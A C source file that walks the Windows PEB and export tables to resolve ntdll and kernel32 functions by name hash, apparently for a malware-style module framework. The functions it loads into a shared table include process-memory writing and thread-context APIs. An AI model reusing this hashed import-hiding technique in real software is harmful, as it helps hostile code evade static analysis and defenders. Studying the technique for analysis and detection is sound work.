#include "zmodule.h"
#include "memory.h"
#include "string.h"
#include "native.h"
#include "utils.h"
#include "privilege.h"
#include "logger.h"
#include "wmi.h"
#include "vector.h"

#define DECLARE_SYSTEM_FUNC(funcName, moduleBase) _pZmoduleBlock->fn##funcName = (Fn##funcName)_pZmoduleBlock->fndynfuncs_get_symbol_by_hash((uint8_t*)moduleBase, funcName##_Hash)

uint8_t* dynfuncs_get_module_base_by_hash(uint32_t dwHash)
{
	PLIST_ENTRY pDllListHead = NULL;
	PLIST_ENTRY pDllListEntry = NULL;
	PUNICODE_STRING dllName;
	uint8_t* pebBaseAddress;
	uint8_t* dllBase = NULL;

#ifdef _WIN64
#define LDR_OFFSET 0x018
#define INMEMORYORDERMODULELIST_OFFSET 0x020
#define FULLDLLNAME_OFFSET 0x048
#define DLLBASE_OFFSET 0x020
	pebBaseAddress = (uint8_t*)__readgsqword(0x60);
#else
#define LDR_OFFSET 0x00C
#define INMEMORYORDERMODULELIST_OFFSET 0x014
#define FULLDLLNAME_OFFSET 0x024
#define DLLBASE_OFFSET 0x010
	pebBaseAddress = (uint8_t*)__readfsdword(0x30);
#endif

	pDllListEntry = pDllListHead = *(PLIST_ENTRY*)(*(uint8_t**)(pebBaseAddress + LDR_OFFSET) + INMEMORYORDERMODULELIST_OFFSET);
	if (pDllListHead != NULL) {
		do {
			dllName = (PUNICODE_STRING)((uint8_t*)pDllListEntry + FULLDLLNAME_OFFSET);

			if (dllName != NULL && dllName->Buffer != NULL) {
				if (utils_wcsihash(dllName->Buffer) == dwHash) {
					dllBase = *(uint8_t**)((uint8_t*)pDllListEntry + DLLBASE_OFFSET);
					break;
				}
			}
			pDllListEntry = pDllListEntry->Flink;
		} while (pDllListEntry != pDllListHead);
	}

	return dllBase;
}

puint_t dynfuncs_get_symbol_by_hash(uint8_t* moduleBase, uint32_t dwHash)
{
	PIMAGE_DOS_HEADER dosHdr = (PIMAGE_DOS_HEADER)moduleBase;
	PIMAGE_NT_HEADERS ntHdr = (PIMAGE_NT_HEADERS)(moduleBase + dosHdr->e_lfanew);
	PIMAGE_EXPORT_DIRECTORY pExports;
	UINT32 i, NumberOfFuncNames;
	PUINT32 AddressOfNames, AddressOfFunctions;
	UINT16 index;
	puint_t apiVA = 0;
	uint32_t exportsSize;

	pExports = (PIMAGE_EXPORT_DIRECTORY)(moduleBase + ntHdr->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
	exportsSize = ntHdr->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size;

	if (pExports != NULL) {
		NumberOfFuncNames = pExports->NumberOfNames;
		AddressOfNames = (PUINT32)(moduleBase + pExports->AddressOfNames);

		for (i = 0; i < NumberOfFuncNames; ++i) {
			char* pThunkRVAtemp = (char*)(moduleBase + *AddressOfNames);
			if (pThunkRVAtemp != NULL) {
				if (utils_strhash(pThunkRVAtemp) == dwHash) {
					UINT16* AddressOfNameOrdinals = (UINT16*)(moduleBase + pExports->AddressOfNameOrdinals);
					AddressOfNameOrdinals += (UINT16)i;
					index = *AddressOfNameOrdinals;
					AddressOfFunctions = (UINT32*)(moduleBase + pExports->AddressOfFunctions);
					AddressOfFunctions += index;
					apiVA = (puint_t)(moduleBase + *AddressOfFunctions);

					// Проверяем является ли адрес форвардным.
					if (((uint8_t*)apiVA >= (uint8_t*)pExports) && ((uint8_t*)apiVA < ((uint8_t*)pExports + exportsSize))) {
						int k;
						wchar_t dllName[128];
						char funcName[64];
						char* ptr = (char*)apiVA;
						uint32_t dllHash;
						uint8_t* moduleBase;

						apiVA = 0;

						__stosb((uint8_t*)dllName, 0, sizeof(dllName));
						__stosb((uint8_t*)funcName, 0, sizeof(funcName));
						for (k = 0; *ptr != '.'; ++ptr, ++k) {
							if (*ptr >= 'A' && *ptr <= 'Z') {
								dllName[k] = (wchar_t)(*ptr | 0x20);
							}
							else {
								dllName[k] = *ptr;
							}
						}
						dllName[k++] = (wchar_t)*ptr;
						dllName[k++] = L'd';
						dllName[k++] = L'l';
						dllName[k++] = L'l';
						if (_pZmoduleBlock != NULL && fn_LoadLibraryW != NULL) {
							moduleBase = (uint8_t*)fn_LoadLibraryW(dllName);
						}
						else {
							dllHash = utils_wcshash(dllName);
							moduleBase = dynfuncs_get_module_base_by_hash(dllHash);
						}
						if (moduleBase != NULL) {
							uint32_t funcHash;
							for (k = 0; *(++ptr) != '\0'; ++k) {
								funcName[k] = *ptr;
							}
							funcHash = utils_strhash(funcName);
							apiVA = dynfuncs_get_symbol_by_hash(moduleBase, funcHash);
						}
						break;
					}
					break;
				}
			}
			++AddressOfNames;
		}
	}
	return apiVA;
}

int dynfuncs_load(int bOnlyBaseDlls)
{
    HMODULE moduleBase;

	// Пользовательские функции
	// memory.h
	_pZmoduleBlock->fnmemory_process_heap = memory_process_heap;
	_pZmoduleBlock->fnmemory_alloc = memory_alloc;
	_pZmoduleBlock->fnmemory_realloc = memory_realloc;
	_pZmoduleBlock->fnmemory_free = memory_free;

	// native.h
	_pZmoduleBlock->fnnative_create_file_win32 = native_create_file_win32;
	_pZmoduleBlock->fnnative_delete_file_win32 = native_delete_file_win32;
	_pZmoduleBlock->fnnative_enum_directory_file = native_enum_directory_file;
	_pZmoduleBlock->fnnative_open_process = native_open_process;
	_pZmoduleBlock->fnnative_get_process_path_by_id = native_get_process_path_by_id;
	_pZmoduleBlock->fnnative_get_process_path = native_get_process_path;
	_pZmoduleBlock->fnnative_query_token_variable_size = native_query_token_variable_size;
	_pZmoduleBlock->fnnative_enum_processes = native_enum_processes;
	_pZmoduleBlock->fnnative_last_status = native_last_status;
	_pZmoduleBlock->fnnative_zms_to_unicode = native_zms_to_unicode;
	_pZmoduleBlock->fnnative_initialize_key_object_attributes = native_initialize_key_object_attributes;
	_pZmoduleBlock->fnnative_open_key = native_open_key;
	_pZmoduleBlock->fnnative_query_registry_value = native_query_registry_value;
	_pZmoduleBlock->fnnative_query_registry_string = native_query_registry_string;
	_pZmoduleBlock->fnnative_complete_query_registry_string = native_complete_query_registry_string;
	_pZmoduleBlock->fnnative_enumerate_key = native_enumerate_key;
	_pZmoduleBlock->fnnative_enumerate_key_value = native_enumerate_key_value;

	// utils.h
	_pZmoduleBlock->fnror = ror;
	_pZmoduleBlock->fnrol = rol;
	_pZmoduleBlock->fnutils_strhash = utils_strhash;
	_pZmoduleBlock->fnutils_wcshash = utils_wcshash;
	_pZmoduleBlock->fnutils_wcsihash = utils_wcsihash;
	_pZmoduleBlock->fnutils_create_thread = utils_create_thread;
	_pZmoduleBlock->fnutils_crc32_build_table = utils_crc32_build_table;
	_pZmoduleBlock->fnutils_crc32_update = utils_crc32_update;
	_pZmoduleBlock->fnutils_wcs_random = utils_wcs_random;
	_pZmoduleBlock->fnutils_machine_guid = utils_machine_guid;

	// string.h
	_pZmoduleBlock->fnzs_new_with_len = zs_new_with_len;
	_pZmoduleBlock->fnzs_new = zs_new;
	_pZmoduleBlock->fnzs_empty = zs_empty;
	_pZmoduleBlock->fnzs_duplicate = zs_duplicate;
	_pZmoduleBlock->fnzs_free = zs_free;
	_pZmoduleBlock->fnzs_length = zs_length;
	_pZmoduleBlock->fnzs_available = zs_available;
	_pZmoduleBlock->fnzs_to_str = zs_to_str;
	_pZmoduleBlock->fnzs_make_room_for = zs_make_room_for;
	_pZmoduleBlock->fnzs_catlen = zs_catlen;
	_pZmoduleBlock->fnzs_cat = zs_cat;
	_pZmoduleBlock->fnzs_update_length = zs_update_length;
	_pZmoduleBlock->fnzs_grow = zs_grow;
	_pZmoduleBlock->fnzs_lastchar = zs_lastchar;
	_pZmoduleBlock->fnzs_catprintf = zs_catprintf;

	// privilege.h
	_pZmoduleBlock->fnprivelege_enable = privelege_enable;

	// wmi.h
	_pZmoduleBlock->fnwmi_extract_arg = wmi_extract_arg;
	_pZmoduleBlock->fnwmi_get_value = wmi_get_value;
	_pZmoduleBlock->fnwmi_enum_begin = wmi_enum_begin;
	_pZmoduleBlock->fnwmi_enum_next = wmi_enum_next;
	_pZmoduleBlock->fnwmi_get_service = wmi_get_service;
	_pZmoduleBlock->fnwmi_obtain_info = wmi_obtain_info;

	// vector.h
	_pZmoduleBlock->fnvector_new = vector_new;
	_pZmoduleBlock->fnvector_destroy = vector_destroy;
	_pZmoduleBlock->fnvector_clear = vector_clear;
	_pZmoduleBlock->fnvector_size = vector_size;
	_pZmoduleBlock->fnvector_count = vector_count;
	_pZmoduleBlock->fnvector_push_back = vector_push_back;
	_pZmoduleBlock->fnvector_pop_back = vector_pop_back;
	_pZmoduleBlock->fnvector_back = vector_back;
	_pZmoduleBlock->fnvector_access = vector_access;
	_pZmoduleBlock->fnvector_at = vector_at;
	_pZmoduleBlock->fnvector_begin = vector_begin;
	_pZmoduleBlock->fnvector_end = vector_end;
	_pZmoduleBlock->fnvector_data_set = vector_data_set;
	_pZmoduleBlock->fnvector_data_get = vector_data_get;

	// dynfuncs.h
	_pZmoduleBlock->fndynfuncs_get_module_base_by_hash = dynfuncs_get_module_base_by_hash;
	_pZmoduleBlock->fndynfuncs_get_symbol_by_hash = dynfuncs_get_symbol_by_hash;
#ifdef LOG_ON
	_pZmoduleBlock->fnlogger_log = logger_log;
#endif // LOG_ON


    // ntdll.dll
	moduleBase = (HMODULE)dynfuncs_get_module_base_by_hash(NTDLL_DLL_HASH);
    if (moduleBase == NULL) {
        return 0;
    }
	DECLARE_SYSTEM_FUNC(NtCurrentTeb, moduleBase);
    DECLARE_SYSTEM_FUNC(ZwMapViewOfSection, moduleBase);
    DECLARE_SYSTEM_FUNC(NtQuerySystemInformation, moduleBase);
    DECLARE_SYSTEM_FUNC(ZwUnmapViewOfSection, moduleBase);
    DECLARE_SYSTEM_FUNC(LdrLoadDll, moduleBase);
    DECLARE_SYSTEM_FUNC(NtClose, moduleBase);
    DECLARE_SYSTEM_FUNC(RtlGetLastWin32Error, moduleBase);
    DECLARE_SYSTEM_FUNC(RtlImageDirectoryEntryToData, moduleBase);
    DECLARE_SYSTEM_FUNC(RtlAddVectoredExceptionHandler, moduleBase);
    DECLARE_SYSTEM_FUNC(RtlRemoveVectoredExceptionHandler, moduleBase);
    DECLARE_SYSTEM_FUNC(ZwOpenSection, moduleBase);
    DECLARE_SYSTEM_FUNC(RtlCompareMemory, moduleBase);
    DECLARE_SYSTEM_FUNC(RtlInitUnicodeString, moduleBase);
    DECLARE_SYSTEM_FUNC(RtlRandomEx, moduleBase);
    DECLARE_SYSTEM_FUNC(towlower, moduleBase);
    DECLARE_SYSTEM_FUNC(_allmul, moduleBase);
    DECLARE_SYSTEM_FUNC(_allshr, moduleBase);
    DECLARE_SYSTEM_FUNC(_aulldiv, moduleBase);
    DECLARE_SYSTEM_FUNC(_aullrem, moduleBase);
    DECLARE_SYSTEM_FUNC(RtlMoveMemory, moduleBase);
    DECLARE_SYSTEM_FUNC(RtlImageNtHeader, moduleBase);
	DECLARE_SYSTEM_FUNC(RtlIpv4AddressToStringW, moduleBase);
	DECLARE_SYSTEM_FUNC(RtlIpv6AddressToStringW, moduleBase);
	DECLARE_SYSTEM_FUNC(ZwOpenSymbolicLinkObject, moduleBase);
	DECLARE_SYSTEM_FUNC(ZwQuerySymbolicLinkObject, moduleBase);
	DECLARE_SYSTEM_FUNC(NtCreateKey, moduleBase);
	DECLARE_SYSTEM_FUNC(NtOpenKey, moduleBase);
	DECLARE_SYSTEM_FUNC(NtQueryValueKey, moduleBase);
	DECLARE_SYSTEM_FUNC(NtOpenProcessToken, moduleBase);
	DECLARE_SYSTEM_FUNC(NtQueryInformationToken, moduleBase);
	DECLARE_SYSTEM_FUNC(RtlConvertSidToUnicodeString, moduleBase);
	DECLARE_SYSTEM_FUNC(ZwOpenProcess, moduleBase);
	DECLARE_SYSTEM_FUNC(NtQueryInformationProcess, moduleBase);
	DECLARE_SYSTEM_FUNC(ZwTerminateProcess, moduleBase);
	DECLARE_SYSTEM_FUNC(NtEnumerateKey, moduleBase);
	DECLARE_SYSTEM_FUNC(ZwEnumerateValueKey, moduleBase);
	DECLARE_SYSTEM_FUNC(RtlDosPathNameToNtPathName_U, moduleBase);
	DECLARE_SYSTEM_FUNC(RtlCreateHeap, moduleBase);
	DECLARE_SYSTEM_FUNC(RtlAllocateHeap, moduleBase);
	DECLARE_SYSTEM_FUNC(RtlReAllocateHeap, moduleBase);
	DECLARE_SYSTEM_FUNC(RtlFreeHeap, moduleBase);
	DECLARE_SYSTEM_FUNC(NtCreateFile, moduleBase);
	DECLARE_SYSTEM_FUNC(NtQueryDirectoryFile, moduleBase);
	DECLARE_SYSTEM_FUNC(NtWaitForSingleObject, moduleBase);
	DECLARE_SYSTEM_FUNC(RtlSubAuthoritySid, moduleBase);
	DECLARE_SYSTEM_FUNC(NtSetValueKey, moduleBase);
	DECLARE_SYSTEM_FUNC(NtSetInformationFile, moduleBase);
	DECLARE_SYSTEM_FUNC(NtQueryFullAttributesFile, moduleBase);
	DECLARE_SYSTEM_FUNC(NtReadVirtualMemory, moduleBase);
	DECLARE_SYSTEM_FUNC(RtlGetVersion, moduleBase);
    DECLARE_SYSTEM_FUNC(NtDeleteValueKey, moduleBase);
    DECLARE_SYSTEM_FUNC(RtlNtStatusToDosError, moduleBase);
    DECLARE_SYSTEM_FUNC(NtDeviceIoControlFile, moduleBase);
    DECLARE_SYSTEM_FUNC(NtQueryInformationFile, moduleBase);
    DECLARE_SYSTEM_FUNC(NtQueryVolumeInformationFile, moduleBase);
    DECLARE_SYSTEM_FUNC(_snprintf, moduleBase);

    // kernel32.dll
	moduleBase = (HMODULE)dynfuncs_get_module_base_by_hash(KERNEL32_DLL_HASH);
    if (moduleBase == NULL) {
        return 0;
    }
#ifdef fn_VirtualAlloc
    DECLARE_SYSTEM_FUNC(VirtualAlloc, moduleBase);
#endif
#ifdef fn_GetCurrentProcessId
    DECLARE_SYSTEM_FUNC(GetCurrentProcessId, moduleBase);
#endif
#ifdef fn_IsBadReadPtr
    DECLARE_SYSTEM_FUNC(IsBadReadPtr, moduleBase);
#endif
#ifdef fn_VirtualProtect
    DECLARE_SYSTEM_FUNC(VirtualProtect, moduleBase);
#endif
#ifdef fn_LoadLibraryW
    DECLARE_SYSTEM_FUNC(LoadLibraryW, moduleBase);
#endif
#ifdef fn_LoadLibraryA
    DECLARE_SYSTEM_FUNC(LoadLibraryA, moduleBase);
#endif
#ifdef fn_LoadLibraryExA
    DECLARE_SYSTEM_FUNC(LoadLibraryExA, moduleBase);
#endif
#ifdef fn_ExitProcess
    DECLARE_SYSTEM_FUNC(ExitProcess, moduleBase);
#endif
#ifdef fn_GetExitCodeProcess
    DECLARE_SYSTEM_FUNC(GetExitCodeProcess, moduleBase);
#endif
#ifdef fn_GetProcAddress
    DECLARE_SYSTEM_FUNC(GetProcAddress, moduleBase);
#endif
#ifdef fn_CreateThread
    DECLARE_SYSTEM_FUNC(CreateThread, moduleBase);
#endif
#ifdef fn_GetCurrentProcess
    DECLARE_SYSTEM_FUNC(GetCurrentProcess, moduleBase);
#endif
#ifdef fn_CloseHandle
    DECLARE_SYSTEM_FUNC(CloseHandle, moduleBase);
#endif
#ifdef fn_GetModuleHandleW
    DECLARE_SYSTEM_FUNC(GetModuleHandleW, moduleBase);
#endif
#ifdef fn_TerminateProcess
    DECLARE_SYSTEM_FUNC(TerminateProcess, moduleBase);
#endif
#ifdef fn_CreateFileMappingW
    DECLARE_SYSTEM_FUNC(CreateFileMappingW, moduleBase);
#endif
#ifdef fn_OpenFileMappingA
    DECLARE_SYSTEM_FUNC(OpenFileMappingA, moduleBase);
#endif
#ifdef fn_CreateProcessW
    DECLARE_SYSTEM_FUNC(CreateProcessW, moduleBase);
#endif
#ifdef fn_CreateFileW
    DECLARE_SYSTEM_FUNC(CreateFileW, moduleBase);
#endif
#ifdef fn_CreateFileA
    DECLARE_SYSTEM_FUNC(CreateFileA, moduleBase);
#endif
#ifdef fn_WriteFile
    DECLARE_SYSTEM_FUNC(WriteFile, moduleBase);
#endif
#ifdef fn_CopyFileW
    DECLARE_SYSTEM_FUNC(CopyFileW,moduleBase);
#endif
#ifdef fn_GetFileSize
    DECLARE_SYSTEM_FUNC(GetFileSize, moduleBase);
#endif
#ifdef fn_DeleteFileW
    DECLARE_SYSTEM_FUNC(DeleteFileW, moduleBase);
#endif
#ifdef fn_MoveFileExW
    DECLARE_SYSTEM_FUNC(MoveFileExW, moduleBase);
#endif
#ifdef fn_GetEnvironmentVariableW
    DECLARE_SYSTEM_FUNC(GetEnvironmentVariableW, moduleBase);
#endif
#ifdef fn_GetThreadContext
    DECLARE_SYSTEM_FUNC(GetThreadContext, moduleBase);
#endif
#ifdef fn_SetThreadContext
    DECLARE_SYSTEM_FUNC(SetThreadContext, moduleBase);
#endif
#ifdef fn_MapViewOfFile
    DECLARE_SYSTEM_FUNC(MapViewOfFile, moduleBase);
#endif
#ifdef fn_ReadFile
    DECLARE_SYSTEM_FUNC(ReadFile, moduleBase);
#endif
#ifdef fn_OpenThread
    DECLARE_SYSTEM_FUNC(OpenThread, moduleBase);
#endif
#ifdef fn_ResumeThread
    DECLARE_SYSTEM_FUNC(ResumeThread, moduleBase);
#endif
#ifdef fn_UnmapViewOfFile
    DECLARE_SYSTEM_FUNC(UnmapViewOfFile, moduleBase);
#endif
#ifdef fn_WaitForSingleObject
    DECLARE_SYSTEM_FUNC(WaitForSingleObject, moduleBase);
#endif
#ifdef fn_VirtualQuery
    DECLARE_SYSTEM_FUNC(VirtualQuery, moduleBase);
#endif
#ifdef fn_VirtualFree
    DECLARE_SYSTEM_FUNC(VirtualFree, moduleBase);
#endif
#ifdef fn_IsWow64Process
    DECLARE_SYSTEM_FUNC(IsWow64Process, moduleBase);
#endif
#ifdef fn_Wow64DisableWow64FsRedirection
    DECLARE_SYSTEM_FUNC(Wow64DisableWow64FsRedirection, moduleBase);
#endif
    DECLARE_SYSTEM_FUNC(Wow64RevertWow64FsRedirection, moduleBase);
#ifdef fn_SleepEx
    DECLARE_SYSTEM_FUNC(SleepEx, moduleBase);
#endif
#ifdef fn_TerminateThread
    DECLARE_SYSTEM_FUNC(TerminateThread, moduleBase);
#endif
#ifdef fn_CreateEventW
    DECLARE_SYSTEM_FUNC(CreateEventW, moduleBase);
#endif
#ifdef fn_CreateEventA
    DECLARE_SYSTEM_FUNC(CreateEventA, moduleBase);
#endif
#ifdef fn_SetEvent
    DECLARE_SYSTEM_FUNC(SetEvent, moduleBase);
#endif
#ifdef fn_ResetEvent
    DECLARE_SYSTEM_FUNC(ResetEvent, moduleBase);
#endif
#ifdef fn_SuspendThread
    DECLARE_SYSTEM_FUNC(SuspendThread, moduleBase);
#endif
#ifdef fn_CreateToolhelp32Snapshot
    DECLARE_SYSTEM_FUNC(CreateToolhelp32Snapshot, moduleBase);
#endif
#ifdef fn_Thread32First
    DECLARE_SYSTEM_FUNC(Thread32First, moduleBase);
#endif
#ifdef fn_Thread32Next
    DECLARE_SYSTEM_FUNC(Thread32Next, moduleBase);
#endif
#ifdef fn_DeviceIoControl
    DECLARE_SYSTEM_FUNC(DeviceIoControl, moduleBase);
#endif
#ifdef fn_FindClose
    DECLARE_SYSTEM_FUNC(FindClose, moduleBase);
#endif
#ifdef fn_FindFirstFileW
    DECLARE_SYSTEM_FUNC(FindFirstFileW, moduleBase);
#endif
#ifdef fn_FindNextFileW
    DECLARE_SYSTEM_FUNC(FindNextFileW, moduleBase);
#endif 
#ifdef fn_GetCurrentThreadId
    DECLARE_SYSTEM_FUNC(GetCurrentThreadId, moduleBase);
#endif
#ifdef fn_GetLastError
    DECLARE_SYSTEM_FUNC(GetLastError, moduleBase);
#endif
#ifdef fn_SetLastError
	DECLARE_SYSTEM_FUNC(SetLastError, moduleBase);
#endif
#ifdef fn_GetModuleFileNameA
    DECLARE_SYSTEM_FUNC(GetModuleFileNameA, moduleBase);
#endif
#ifdef fn_Process32FirstW
    DECLARE_SYSTEM_FUNC(Process32FirstW, moduleBase);
#endif
#ifdef fn_Process32NextW
    DECLARE_SYSTEM_FUNC(Process32NextW, moduleBase);
#endif
#ifdef fn_lstrlenW
    DECLARE_SYSTEM_FUNC(lstrlenW, moduleBase);
#endif
#ifdef fn_lstrlenA
    DECLARE_SYSTEM_FUNC(lstrlenA, moduleBase);
#endif
#ifdef fn_lstrcatW
    DECLARE_SYSTEM_FUNC(lstrcatW, moduleBase);
#endif
#ifdef fn_lstrcatA
    DECLARE_SYSTEM_FUNC(lstrcatA, moduleBase);
#endif
#ifdef fn_lstrcmpiW
    DECLARE_SYSTEM_FUNC(lstrcmpiW, moduleBase);
#endif
#ifdef fn_lstrcmpiA
    DECLARE_SYSTEM_FUNC(lstrcmpiA, moduleBase);
#endif
#ifdef fn_lstrcpyW
    DECLARE_SYSTEM_FUNC(lstrcpyW, moduleBase);
#endif
#ifdef fn_lstrcpyA
    DECLARE_SYSTEM_FUNC(lstrcpyA, moduleBase);
#endif
#ifdef fn_SetFilePointer
    DECLARE_SYSTEM_FUNC(SetFilePointer, moduleBase);
#endif
#ifdef fn_CreateSemaphoreW
    DECLARE_SYSTEM_FUNC(CreateSemaphoreW, moduleBase);
#endif
#ifdef fn_FreeLibrary
    DECLARE_SYSTEM_FUNC(FreeLibrary, moduleBase);
#endif
#ifdef fn_GetACP
    DECLARE_SYSTEM_FUNC(GetACP, moduleBase);
#endif
#ifdef fn_GetCurrentThread
    DECLARE_SYSTEM_FUNC(GetCurrentThread, moduleBase);
#endif
#ifdef fn_SetThreadAffinityMask
    DECLARE_SYSTEM_FUNC(SetThreadAffinityMask, moduleBase);
#endif
#ifdef fn_SetPriorityClass
    DECLARE_SYSTEM_FUNC(SetPriorityClass, moduleBase);
#endif
#ifdef fn_GetSystemInfo
    DECLARE_SYSTEM_FUNC(GetSystemInfo, moduleBase);
#endif
#ifdef fn_GetTempPathW
    DECLARE_SYSTEM_FUNC(GetTempPathW, moduleBase);
#endif
#ifdef fn_GetLongPathNameW
    DECLARE_SYSTEM_FUNC(GetLongPathNameW, moduleBase);
#endif
#ifdef fn_GetTempFileNameW
    DECLARE_SYSTEM_FUNC(GetTempFileNameW, moduleBase);
#endif 
#ifdef fn_Sleep
    DECLARE_SYSTEM_FUNC(Sleep, moduleBase);
#endif
#ifdef fn_LoadLibraryExW
    DECLARE_SYSTEM_FUNC(LoadLibraryExW, moduleBase);
#endif
#ifdef fn_DuplicateHandle
    DECLARE_SYSTEM_FUNC(DuplicateHandle, moduleBase);
#endif
#ifdef fn_CreateFileMappingA
    DECLARE_SYSTEM_FUNC(CreateFileMappingA, moduleBase);
#endif
#ifdef fn_GetSystemDirectoryW
    DECLARE_SYSTEM_FUNC(GetSystemDirectoryW, moduleBase);
#endif
#ifdef fn_ExitThread
    DECLARE_SYSTEM_FUNC(ExitThread, moduleBase);
#endif
#ifdef fn_GetTickCount
    DECLARE_SYSTEM_FUNC(GetTickCount, moduleBase);
#endif 
#ifdef fn_lstrcpynA
    DECLARE_SYSTEM_FUNC(lstrcpynA, moduleBase);
#endif
#ifdef fn_lstrcpynW
    DECLARE_SYSTEM_FUNC(lstrcpynW, moduleBase);
#endif
#ifdef fn_WriteProcessMemory
    DECLARE_SYSTEM_FUNC(WriteProcessMemory, moduleBase);
#endif
#ifdef fn_ReadProcessMemory
    DECLARE_SYSTEM_FUNC(ReadProcessMemory, moduleBase);
#endif
#ifdef fn_OpenEventA
    DECLARE_SYSTEM_FUNC(OpenEventA, moduleBase);
#endif
#ifdef fn_RemoveDirectoryW
    DECLARE_SYSTEM_FUNC(RemoveDirectoryW, moduleBase);
#endif 
#ifdef fn_CreateDirectoryW
    DECLARE_SYSTEM_FUNC(CreateDirectoryW, moduleBase);
#endif
#ifdef fn_FlushViewOfFile
    DECLARE_SYSTEM_FUNC(FlushViewOfFile, moduleBase);
#endif
#ifdef fn_GetModuleFileNameW
    DECLARE_SYSTEM_FUNC(GetModuleFileNameW, moduleBase);
#endif
#ifdef fn_GetLocalTime
    DECLARE_SYSTEM_FUNC(GetLocalTime, moduleBase);
#endif
#ifdef fn_SystemTimeToFileTime
    DECLARE_SYSTEM_FUNC(SystemTimeToFileTime, moduleBase);
#endif
#ifdef fn_lstrcmpA
    DECLARE_SYSTEM_FUNC(lstrcmpA, moduleBase);
#endif
#ifdef fn_lstrcmpW
    DECLARE_SYSTEM_FUNC(lstrcmpW, moduleBase);
#endif
#ifdef fn_FlushInstructionCache
    DECLARE_SYSTEM_FUNC(FlushInstructionCache, moduleBase);
#endif
#ifdef fn_GetProcessHeap
    DECLARE_SYSTEM_FUNC(GetProcessHeap, moduleBase);
#endif
#ifdef fn_SetEndOfFile
    DECLARE_SYSTEM_FUNC(SetEndOfFile, moduleBase);
#endif
#ifdef fn_VirtualQueryEx
    DECLARE_SYSTEM_FUNC(VirtualQueryEx, moduleBase);
#endif
#ifdef fn_OpenProcess
    DECLARE_SYSTEM_FUNC(OpenProcess, moduleBase);
#endif
#ifdef fn_OpenMutexA
    DECLARE_SYSTEM_FUNC(OpenMutexA, moduleBase);
#endif
#ifdef fn_CreateMutexA
    DECLARE_SYSTEM_FUNC(CreateMutexA, moduleBase);
#endif
#ifdef fn_ReleaseMutex
	DECLARE_SYSTEM_FUNC(ReleaseMutex, moduleBase);
#endif
#ifdef fn_MultiByteToWideChar
    DECLARE_SYSTEM_FUNC(MultiByteToWideChar, moduleBase);
#endif
#ifdef fn_HeapCreate
    DECLARE_SYSTEM_FUNC(HeapCreate, moduleBase);
#endif
#ifdef fn_HeapDestroy
    DECLARE_SYSTEM_FUNC(HeapDestroy, moduleBase);
#endif
#ifdef fn_HeapSize
    DECLARE_SYSTEM_FUNC(HeapSize, moduleBase);
#endif
#ifdef fn_HeapAlloc
    DECLARE_SYSTEM_FUNC(HeapAlloc, moduleBase);
#endif
#ifdef fn_HeapReAlloc
    DECLARE_SYSTEM_FUNC(HeapReAlloc, moduleBase);
#endif
#ifdef fn_HeapFree
    DECLARE_SYSTEM_FUNC(HeapFree, moduleBase); 
#endif
#ifdef fn_InitializeCriticalSection
    DECLARE_SYSTEM_FUNC(InitializeCriticalSection, moduleBase);
#endif
#ifdef fn_EnterCriticalSection
    DECLARE_SYSTEM_FUNC(EnterCriticalSection, moduleBase);
#endif
#ifdef fn_TryEnterCriticalSection
    DECLARE_SYSTEM_FUNC(TryEnterCriticalSection, moduleBase);
#endif
#ifdef fn_LeaveCriticalSection
    DECLARE_SYSTEM_FUNC(LeaveCriticalSection, moduleBase);
#endif
#ifdef fn_DeleteCriticalSection
    DECLARE_SYSTEM_FUNC(DeleteCriticalSection, moduleBase);
#endif
#ifdef fn_GetDateFormatA
    DECLARE_SYSTEM_FUNC(GetDateFormatA, moduleBase);
#endif
#ifdef fn_GetTimeFormatA
    DECLARE_SYSTEM_FUNC(GetTimeFormatA, moduleBase);
#endif
#ifdef fn_OutputDebugStringA
    DECLARE_SYSTEM_FUNC(OutputDebugStringA, moduleBase);
#endif
#ifdef fn_OutputDebugStringW
    DECLARE_SYSTEM_FUNC(OutputDebugStringW, moduleBase);
#endif
#ifdef fn_GetExitCodeThread
    DECLARE_SYSTEM_FUNC(GetExitCodeThread, moduleBase);
#endif
#ifdef fn_GetCurrentDirectoryW
    DECLARE_SYSTEM_FUNC(GetCurrentDirectoryW, moduleBase);
#endif
#ifdef fn_SetCurrentDirectoryW
    DECLARE_SYSTEM_FUNC(SetCurrentDirectoryW, moduleBase);
#endif
#ifdef fn_GetStringTypeW
    DECLARE_SYSTEM_FUNC(GetStringTypeW, moduleBase);
#endif
#ifdef fn_TlsSetValue
    DECLARE_SYSTEM_FUNC(TlsSetValue, moduleBase);
#endif
#ifdef fn_TlsGetValue
    DECLARE_SYSTEM_FUNC(TlsGetValue, moduleBase);
#endif
#ifdef fn_TlsAlloc
    DECLARE_SYSTEM_FUNC(TlsAlloc, moduleBase);
#endif
#ifdef fn_TlsFree
    DECLARE_SYSTEM_FUNC(TlsFree, moduleBase);
#endif
#ifdef fn_SetThreadPriority
    DECLARE_SYSTEM_FUNC(SetThreadPriority, moduleBase);
#endif
#ifdef fn_SetThreadAffinityMask
    DECLARE_SYSTEM_FUNC(SetThreadAffinityMask, moduleBase);
#endif
#ifdef fn_GetLocaleInfoW
    DECLARE_SYSTEM_FUNC(GetLocaleInfoW, moduleBase);
#endif
#ifdef fn_IsDebuggerPresent
    DECLARE_SYSTEM_FUNC(IsDebuggerPresent, moduleBase);
#endif
#ifdef fn_WideCharToMultiByte
    DECLARE_SYSTEM_FUNC(WideCharToMultiByte, moduleBase);
#endif
#ifdef fn_AreFileApisANSI
    DECLARE_SYSTEM_FUNC(AreFileApisANSI, moduleBase);
#endif
#ifdef fn_LockFileEx
    DECLARE_SYSTEM_FUNC(LockFileEx, moduleBase);
#endif
#ifdef fn_UnlockFileEx
    DECLARE_SYSTEM_FUNC(UnlockFileEx, moduleBase);
#endif
#ifdef fn_FlushFileBuffers
    DECLARE_SYSTEM_FUNC(FlushFileBuffers, moduleBase);
#endif
#ifdef fn_GetFileAttributesExW
    DECLARE_SYSTEM_FUNC(GetFileAttributesExW, moduleBase);
#endif
#ifdef fn_GetFileAttributesW
    DECLARE_SYSTEM_FUNC(GetFileAttributesW, moduleBase);
#endif
#ifdef fn_GetFullPathNameW
    DECLARE_SYSTEM_FUNC(GetFullPathNameW, moduleBase);
#endif
#ifdef fn_GetSystemTime
    DECLARE_SYSTEM_FUNC(GetSystemTime, moduleBase);
#endif
#ifdef fn_QueryPerformanceCounter
    DECLARE_SYSTEM_FUNC(QueryPerformanceCounter, moduleBase);
#endif
#ifdef fn_QueryPerformanceFrequency
	DECLARE_SYSTEM_FUNC(QueryPerformanceFrequency, moduleBase);
#endif
